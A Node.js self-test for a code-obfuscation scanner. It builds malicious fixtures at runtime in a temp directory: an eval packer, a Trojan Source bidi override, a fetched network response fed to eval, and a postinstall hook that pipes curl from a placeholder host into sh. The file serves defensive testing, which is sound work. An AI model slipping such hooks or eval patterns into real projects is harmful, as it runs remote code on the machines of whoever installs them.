#!/usr/bin/env node
// obfuscation-scan-ignore-file: builds malicious fixtures at runtime (in a temp dir) to prove the scanner catches them.
/**
 * Self-test for scripts/scan-obfuscation.mjs: the gate is only useful if it actually fires.
 * Fixtures are assembled from char codes at runtime so this file never contains the payloads.
 */
import { execFileSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const scanner = resolve(dirname(fileURLToPath(import.meta.url)), 'scan-obfuscation.mjs');
const s = (...codes) => String.fromCharCode(...codes);
const EVAL = s(101, 118, 97, 108);
const BIDI = s(0x202e);
const CURL_PIPE_SH = [s(99, 117, 114, 108), 'https://x.test/i.sh', s(124), s(115, 104)].join(' ');

const cases = [
  { name: 'clean module', expectFail: false, code: 'export const add = (a, b) => a + b;\n' },
  { name: 'eval packer', expectFail: true, code: `${EVAL}(function(p,a,c,k,e,d){return p})('x',1,1,'x'.split('|'),0,{});\n` },
  { name: 'Trojan Source bidi override', expectFail: true, code: `const access = "user${BIDI} // admin";\n` },
  {
    name: 'network response piped into eval',
    expectFail: true,
    code: `fetch("https://x.test/p").then(r=>r.text()).then(t=>${EVAL}(t));\n`,
  },
  {
    name: 'install hook downloads and runs a script',
    expectFail: true,
    file: 'package.json',
    code: JSON.stringify({ name: 'x', scripts: { postinstall: CURL_PIPE_SH } }),
  },
];

let failed = 0;
for (const c of cases) {
  const dir = mkdtempSync(join(tmpdir(), 'salescrm-scan-'));
  try {
    writeFileSync(join(dir, c.file ?? 'sample.js'), c.code);
    let flagged = false;
    try {
      execFileSync(process.execPath, [scanner, '--quiet'], { cwd: dir, stdio: 'pipe' });
    } catch {
      flagged = true;
    }
    const ok = flagged === c.expectFail;
    if (!ok) failed += 1;
    console.log(`${ok ? '✓' : '✖'} ${c.name} → ${flagged ? 'flagged' : 'clean'}`);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}
if (failed > 0) {
  console.error(`\n✖ scanner self-test: ${failed} case(s) wrong`);
  process.exit(1);
}
console.log('✓ scanner self-test');
